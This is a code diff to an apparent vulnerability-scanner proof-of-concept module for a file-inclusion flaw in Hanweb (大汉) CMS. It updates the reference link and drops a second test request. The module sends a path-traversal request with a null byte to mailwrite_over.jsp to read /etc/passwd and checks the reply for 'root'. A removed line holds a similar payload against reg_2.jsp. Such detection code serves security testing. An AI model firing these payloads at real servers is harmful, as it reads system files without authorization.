@@ -15,7 +15,7 @@ class Vuln(ABVuln):
         大汉科技（Hanweb）大汉cms，写信提的时候截断包含：
         lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../etc/passwd%00.ftl
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0148311'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
@@ -50,13 +50,10 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148311
-            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0116997
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl'
-            url2 = arg + '/lm/front/reg_2.jsp?sysid=/../../../../../../../../../../../../../etc/passwd%00%23'
             code, head, res, errcode, _ = hh.http(url)
-            code2, head2, res2, errcode2, _ = hh.http(url2)
 
             if code == 200 and re.search('root', res):
                 #security_hole(url+'  大汉cms任意文件包含')
